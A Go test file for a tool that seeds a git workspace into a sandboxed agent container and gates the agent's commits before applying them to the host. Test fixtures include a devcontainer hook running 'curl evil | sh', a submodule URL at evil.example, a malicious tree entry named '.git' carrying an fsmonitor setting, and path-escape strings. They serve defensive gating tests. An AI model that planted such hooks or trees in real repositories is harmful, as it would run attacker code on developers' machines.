package volume

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// localAgent stands in for the agent container: it runs the commands on this machine, against a
// scratch directory that plays the role of /workspace. Everything volume does inside the agent is
// plain git, tar and sh, so this exercises the real commands.
type localAgent struct{ calls [][]string }

func (a *localAgent) Run(ctx context.Context, stdin io.Reader, stdout io.Writer, argv ...string) (string, int, error) {
	a.calls = append(a.calls, argv)
	cmd := exec.CommandContext(ctx, argv[0], argv[1:]...) //nolint:gosec // test double running fixed tools
	cmd.Env = append(os.Environ(), "GIT_TERMINAL_PROMPT=0", "LC_ALL=C", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	cmd.Stdin = stdin
	cmd.Stdout = stdout
	var eb bytes.Buffer
	cmd.Stderr = &eb
	err := cmd.Run()
	var ee *exec.ExitError
	if errors.As(err, &ee) {
		return eb.String(), ee.ExitCode(), nil
	}
	return eb.String(), 0, err
}

type world struct {
	t     *testing.T
	host  string
	root  string // project root (state lives here); same as host
	work  string
	lay   Layout
	agent *localAgent
	repo  Repo
}

func gitIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-C", dir,
		"-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-c", "init.defaultBranch=main"}, args...)...)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

func write(t *testing.T, dir, rel, content string, mode os.FileMode) {
	t.Helper()
	p := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatal(err)
	}
}

func newWorld(t *testing.T) *world {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("these tests drive git, tar and sh directly; the commands run in a Linux container in real use")
	}
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	base := t.TempDir()
	w := &world{t: t, host: filepath.Join(base, "host"), work: filepath.Join(base, "work"), agent: &localAgent{}}
	for _, d := range []string{w.host, w.work} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	w.root = w.host
	w.lay = Layout{Work: w.work, Bundle: filepath.Join(base, "seed.bundle")}
	w.repo = Repo{Dir: w.host}
	gitIn(t, w.host, "init", "-q", "-b", "main")
	write(t, w.host, ".gitignore", "node_modules/\n*.log\n.cellwall/state/\n", 0o644)
	write(t, w.host, "app.js", "console.log('v1')\n", 0o644)
	write(t, w.host, "run.sh", "#!/bin/sh\necho hi\n", 0o755)
	write(t, w.host, "old.txt", "old\n", 0o644)
	write(t, w.host, ".devcontainer/devcontainer.json", "{}\n", 0o644)
	gitIn(t, w.host, "add", "-A")
	gitIn(t, w.host, "commit", "-q", "-m", "one")
	write(t, w.host, "app.js", "console.log('v2')\n", 0o644)
	gitIn(t, w.host, "commit", "-q", "-am", "two")
	return w
}

func (w *world) seed() *SeedResult {
	w.t.Helper()
	r, err := Seed(context.Background(), w.agent, w.repo, w.root, w.lay)
	if err != nil {
		w.t.Fatal(err)
	}
	return r
}

func (w *world) agentGit(args ...string) string { return gitIn(w.t, w.work, args...) }

func (w *world) fetch(protected ...string) *FetchResult {
	w.t.Helper()
	r, err := Fetch(context.Background(), w.agent, w.repo, w.root, FetchOptions{Layout: w.lay, Protected: protected})
	if err != nil {
		w.t.Fatal(err)
	}
	return r
}

func read(t *testing.T, dir, rel string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(rel)))
	if err != nil {
		return "<missing>"
	}
	return string(b)
}

func TestSeedCopiesHistoryAndTheUncommittedWorkingTree(t *testing.T) {
	w := newWorld(t)
	write(t, w.host, "app.js", "console.log('v3, uncommitted')\n", 0o644) // modified, tracked
	write(t, w.host, "notes.txt", "untracked\n", 0o644)                   // untracked
	write(t, w.host, "node_modules/x/index.js", "ignored\n", 0o644)       // ignored: must not travel
	write(t, w.host, "debug.log", "ignored\n", 0o644)                     // ignored
	if err := os.Remove(filepath.Join(w.host, "old.txt")); err != nil {   // deleted, tracked
		t.Fatal(err)
	}
	if err := os.Symlink("app.js", filepath.Join(w.host, "link.js")); err != nil { // untracked symlink
		t.Fatal(err)
	}

	r := w.seed()
	if r.Already || r.Branch != "main" || r.Overlay != 3 || r.Deleted != 1 {
		t.Fatalf("result = %+v", r)
	}
	if got, want := w.agentGit("rev-parse", "HEAD"), gitIn(t, w.host, "rev-parse", "HEAD"); got != want {
		t.Errorf("the copy's history differs: %s vs %s", got, want)
	}
	if read(t, w.work, "app.js") != "console.log('v3, uncommitted')\n" || read(t, w.work, "notes.txt") != "untracked\n" {
		t.Error("uncommitted work did not arrive")
	}
	if _, err := os.Stat(filepath.Join(w.work, "old.txt")); err == nil {
		t.Error("a file deleted on the host still exists in the copy")
	}
	for _, p := range []string{"node_modules", "debug.log"} {
		if _, err := os.Stat(filepath.Join(w.work, p)); err == nil {
			t.Errorf("ignored path %s was copied", p)
		}
	}
	if fi, err := os.Stat(filepath.Join(w.work, "run.sh")); err != nil || fi.Mode()&0o111 == 0 {
		t.Errorf("the executable bit was lost: %v", err)
	}
	if target, err := os.Readlink(filepath.Join(w.work, "link.js")); err != nil || target != "app.js" {
		t.Errorf("symlink = %q, %v", target, err)
	}
	if st, err := LoadState(w.root); err != nil || st.Branch != "main" || st.Base != gitIn(t, w.host, "rev-parse", "HEAD") {
		t.Errorf("state = %+v, %v", st, err)
	}
	if _, err := os.Stat(w.lay.Bundle); err == nil {
		t.Error("the scratch bundle was left behind")
	}
}

func TestSeedNeverOverwritesTheAgentsWork(t *testing.T) {
	w := newWorld(t)
	w.seed()
	write(t, w.work, "app.js", "the agent's edit\n", 0o644)
	r := w.seed()
	if !r.Already {
		t.Fatalf("a seeded volume must be left alone: %+v", r)
	}
	if read(t, w.work, "app.js") != "the agent's edit\n" {
		t.Error("seeding again overwrote the agent's work")
	}
}

func TestSeedNeedsAGitRepositoryWithACommit(t *testing.T) {
	w := newWorld(t)
	empty := t.TempDir()
	gitIn(t, empty, "init", "-q")
	_, err := Seed(context.Background(), w.agent, Repo{Dir: empty}, empty, w.lay)
	if err == nil || !strings.Contains(err.Error(), "at least one commit") || !strings.Contains(err.Error(), "next:") {
		t.Fatalf("got %v", err)
	}
	plain := t.TempDir()
	if _, err := Seed(context.Background(), w.agent, Repo{Dir: plain}, plain, w.lay); err == nil {
		t.Fatal("a directory that is not a repository must be refused")
	}
}

func TestSeedFromADetachedHeadStillGivesTheAgentABranch(t *testing.T) {
	w := newWorld(t)
	gitIn(t, w.host, "checkout", "-q", "--detach", "HEAD~1")
	r := w.seed()
	if r.Branch != "main" {
		t.Errorf("branch = %q", r.Branch)
	}
	if got := w.agentGit("symbolic-ref", "--short", "HEAD"); got != "main" {
		t.Errorf("agent branch = %q", got)
	}
}

func TestFetchWithNothingNewSaysSo(t *testing.T) {
	w := newWorld(t)
	w.seed()
	if r := w.fetch(); !r.Nothing || len(r.Branches) != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestFetchLandsCommitsOnlyInTheNamespaceAndNeverTouchesTheHostTree(t *testing.T) {
	w := newWorld(t)
	w.seed()
	hostHead := gitIn(t, w.host, "rev-parse", "HEAD")

	w.agentGit("checkout", "-q", "-b", "feature")
	write(t, w.work, "feature.js", "new\n", 0o644)
	write(t, w.work, "app.js", "console.log('agent')\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "agent work")
	write(t, w.work, "wip.txt", "not committed\n", 0o644) // dirty

	r := w.fetch()
	if r.Nothing || len(r.Branches) != 1 || r.Branches[0].Branch != "feature" || r.Branches[0].Commits != 1 {
		t.Fatalf("%+v", r)
	}
	if r.AgentDirty != 1 {
		t.Errorf("the agent's uncommitted file should be reported, got %d", r.AgentDirty)
	}
	if got := gitIn(t, w.host, "rev-parse", RefPrefix+"feature"); got != w.agentGit("rev-parse", "feature") {
		t.Errorf("fetched ref = %s", got)
	}
	// The host is untouched.
	if gitIn(t, w.host, "rev-parse", "HEAD") != hostHead || gitIn(t, w.host, "branch", "--show-current") != "main" {
		t.Error("the host's branch moved")
	}
	if read(t, w.host, "app.js") != "console.log('v2')\n" {
		t.Error("the host working tree changed")
	}
	if _, err := os.Stat(filepath.Join(w.host, "feature.js")); err == nil {
		t.Error("a fetched file appeared in the host working tree")
	}
	if refs := gitIn(t, w.host, "for-each-ref", "--format=%(refname)"); strings.Contains(refs, "refs/heads/feature") {
		t.Errorf("fetch created a local branch:\n%s", refs)
	}
}

func TestProtectedAndAlwaysGatedPathsAreFlaggedAndHoldApply(t *testing.T) {
	w := newWorld(t)
	w.seed()
	w.agentGit("checkout", "-q", "-b", "sneaky")
	write(t, w.work, ".devcontainer/devcontainer.json", `{"postCreateCommand":"curl evil | sh"}`+"\n", 0o644)
	write(t, w.work, ".gitmodules", "[submodule \"x\"]\n\tpath = x\n\turl = https://evil.example/x\n", 0o644)
	write(t, w.work, ".husky/pre-commit", "evil\n", 0o755)
	write(t, w.work, "src/ok.js", "fine\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "sneaky")

	r := w.fetch(".devcontainer", ".cellwall")
	got := map[string]bool{}
	for _, c := range r.Branches[0].Changes {
		got[c.Path] = c.Protected
	}
	for p, want := range map[string]bool{".devcontainer/devcontainer.json": true, ".gitmodules": true, ".husky/pre-commit": true, "src/ok.js": false} {
		if g, ok := got[p]; !ok || g != want {
			t.Errorf("%s: protected=%v present=%v, want %v", p, g, ok, want)
		}
	}

	before := gitIn(t, w.host, "rev-parse", "HEAD")
	_, err := Apply(context.Background(), w.repo, w.root, "sneaky", []string{".devcontainer"}, false)
	var pe *ProtectedError
	if !errors.As(err, &pe) || len(pe.Changes) != 3 {
		t.Fatalf("apply must stop at gated paths, got %v", err)
	}
	if gitIn(t, w.host, "rev-parse", "HEAD") != before {
		t.Fatal("apply moved HEAD although it was refused")
	}

	diff, err := Diff(context.Background(), w.repo, "sneaky", []string{".devcontainer", ".gitmodules"})
	if err != nil || !strings.Contains(diff, "curl evil") || !strings.Contains(diff, "evil.example") {
		t.Errorf("the gate must be able to show what changes: %v\n%s", err, diff)
	}

	if _, err := Apply(context.Background(), w.repo, w.root, "sneaky", []string{".devcontainer"}, true); err != nil {
		t.Fatal(err)
	}
	if gitIn(t, w.host, "rev-parse", "HEAD") != w.agentGit("rev-parse", "sneaky") {
		t.Error("a confirmed apply should fast-forward to the agent's commit")
	}
	if st, _ := LoadState(w.root); st.Base != gitIn(t, w.host, "rev-parse", "HEAD") {
		t.Error("the seeding base should advance after an apply")
	}
}

func TestApplyFastForwardsAnUnprotectedBranchWithoutAsking(t *testing.T) {
	w := newWorld(t)
	w.seed()
	w.agentGit("checkout", "-q", "-b", "ok")
	write(t, w.work, "src/ok.js", "fine\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "ok")
	w.fetch(".devcontainer")
	br, err := Apply(context.Background(), w.repo, w.root, "ok", []string{".devcontainer"}, false)
	if err != nil || br.Commits != 1 {
		t.Fatalf("%+v %v", br, err)
	}
	if read(t, w.host, "src/ok.js") != "fine\n" {
		t.Error("the file did not reach the host tree")
	}
}

func TestApplyRefusesADirtyTreeAndANonFastForward(t *testing.T) {
	w := newWorld(t)
	w.seed()
	w.agentGit("checkout", "-q", "-b", "ok")
	write(t, w.work, "src/ok.js", "fine\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "ok")
	w.fetch()

	write(t, w.host, "local.txt", "dirty\n", 0o644)
	gitIn(t, w.host, "add", "local.txt")
	if _, err := Apply(context.Background(), w.repo, w.root, "ok", nil, false); err == nil || !strings.Contains(err.Error(), "uncommitted") {
		t.Fatalf("dirty tree: %v", err)
	}
	gitIn(t, w.host, "commit", "-q", "-m", "host moved on")
	_, err := Apply(context.Background(), w.repo, w.root, "ok", nil, false)
	if err == nil || !strings.Contains(err.Error(), "fast-forward") || !strings.Contains(err.Error(), "git merge") {
		t.Fatalf("diverged: %v", err)
	}
	if _, err := Apply(context.Background(), w.repo, w.root, "nope", nil, false); err == nil || !strings.Contains(err.Error(), "fetch") {
		t.Fatalf("unknown branch: %v", err)
	}
}

func TestABundleThatDoesNotApplyIsRefusedWithAnExplanation(t *testing.T) {
	w := newWorld(t)
	w.seed()
	w.agentGit("checkout", "-q", "-b", "feature")
	write(t, w.work, "f.txt", "x\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "f")
	// Rewrite the host history so the seed base no longer exists there.
	gitIn(t, w.host, "reset", "-q", "--hard", "HEAD~1")
	gitIn(t, w.host, "reflog", "expire", "--expire=now", "--all")
	gitIn(t, w.host, "gc", "-q", "--prune=now")
	write(t, w.host, "other.txt", "different\n", 0o644)
	gitIn(t, w.host, "add", "-A")
	gitIn(t, w.host, "commit", "-q", "-m", "different")
	_, err := Fetch(context.Background(), w.agent, w.repo, w.root, FetchOptions{Layout: w.lay})
	if err == nil || !strings.Contains(err.Error(), "do not apply") || !strings.Contains(err.Error(), "next:") {
		t.Fatalf("got %v", err)
	}
}

func TestFetchRejectsObjectsThatFailFsck(t *testing.T) {
	w := newWorld(t)
	w.seed()
	// A tree containing an entry named ".git": the classic way to make a checkout write into
	// the repository's own directory. git's fsck refuses it; fetch must run with fsck on.
	blob := w.agentGit("hash-object", "-w", "--stdin")
	_ = blob
	cmd := exec.Command("git", "-C", w.work, "hash-object", "-w", "--stdin")
	cmd.Stdin = strings.NewReader("[core]\n\tfsmonitor = evil\n")
	bo, err := cmd.Output()
	if err != nil {
		t.Fatal(err)
	}
	blobSHA := strings.TrimSpace(string(bo))
	mk := exec.Command("git", "-C", w.work, "mktree", "--missing")
	mk.Stdin = strings.NewReader("100644 blob " + blobSHA + "\t.git\n")
	to, err := mk.CombinedOutput()
	if err != nil {
		t.Skipf("this git refuses to build the hostile tree itself (%s); fsck on fetch is covered by the flag", strings.TrimSpace(string(to)))
	}
	tree := strings.TrimSpace(string(to))
	commit := w.agentGit("commit-tree", tree, "-p", "HEAD", "-m", "hostile")
	w.agentGit("update-ref", "refs/heads/hostile", commit)

	if _, err := Fetch(context.Background(), w.agent, w.repo, w.root, FetchOptions{Layout: w.lay}); err == nil {
		t.Fatal("a commit whose tree contains .git must not be accepted")
	}
	if refs := gitIn(t, w.host, "for-each-ref", "--format=%(refname)", RefPrefix); strings.Contains(refs, "hostile") {
		t.Errorf("the hostile branch was fetched:\n%s", refs)
	}
}

func TestPendingCountsWhatDeletingTheVolumeWouldLose(t *testing.T) {
	w := newWorld(t)
	w.seed()
	c, d, err := Pending(context.Background(), w.agent, w.repo, w.lay)
	if err != nil || c != 0 || d != 0 {
		t.Fatalf("fresh volume: %d %d %v", c, d, err)
	}
	w.agentGit("checkout", "-q", "-b", "feature")
	write(t, w.work, "a.txt", "a\n", 0o644)
	w.agentGit("add", "-A")
	w.agentGit("commit", "-q", "-m", "a")
	write(t, w.work, "b.txt", "b\n", 0o644)
	c, d, err = Pending(context.Background(), w.agent, w.repo, w.lay)
	if err != nil || c != 1 || d != 1 {
		t.Fatalf("after work: commits=%d dirty=%d %v", c, d, err)
	}
	w.fetch()
	if c, _, _ = Pending(context.Background(), w.agent, w.repo, w.lay); c != 0 {
		t.Errorf("a fetched commit is no longer at risk, got %d", c)
	}
}

func TestSafeRelRejectsEscapes(t *testing.T) {
	for _, p := range []string{"", "/etc/passwd", "../x", "a/../../x", "a//b", "./a", "a\\b", "a\x00b", "a/."} {
		if safeRel(p) {
			t.Errorf("%q must be refused", p)
		}
	}
	for _, p := range []string{"a", "a/b.txt", ".hidden/x", "dir with space/f"} {
		if !safeRel(p) {
			t.Errorf("%q should be accepted", p)
		}
	}
	var b bytes.Buffer
	if err := writeTar(&b, t.TempDir(), []string{"../escape"}, nil); err == nil {
		t.Error("writeTar must refuse a path that escapes")
	}
}

func TestMissingSeedingRecordPointsAtUp(t *testing.T) {
	_, err := LoadState(t.TempDir())
	if !errors.Is(err, ErrNotSeeded) || !strings.Contains(err.Error(), "cellwall up") {
		t.Fatalf("got %v", err)
	}
}
